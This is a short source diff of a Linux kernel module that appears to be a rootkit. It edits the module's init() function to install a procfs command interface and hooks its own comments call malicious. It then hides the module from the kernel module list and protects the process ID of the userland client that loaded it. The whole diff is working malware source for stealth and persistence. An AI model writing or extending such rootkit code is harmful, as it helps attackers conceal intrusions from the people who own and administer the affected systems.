@@ -1,5 +1,6 @@
 #include "inc/cmds.h"
 #include "inc/hook.h"
+#include "inc/util.h"
 
 // clang-format off
 
@@ -36,15 +37,30 @@ module_init(init);
 module_exit(cleanup);
 
 int init() {
+  // setup procfs command interface
   if (!cmds_install()) {
     cleanup();
     return -1;
   }
 
+  // install malicious hooks
   if (!hooks_install()) {
     cleanup();
     return -1;
   }
+
+  // remove the module from the module list
+  hideself();
+
+  /*
+
+   * unless we are running in debug mode
+   * the userland client inserted us into the kernel
+   * so lets protect it
+
+  */
+  if(!SHRK_DEBUG)
+    protect_pid(current->pid);
 
   return 0;
 }
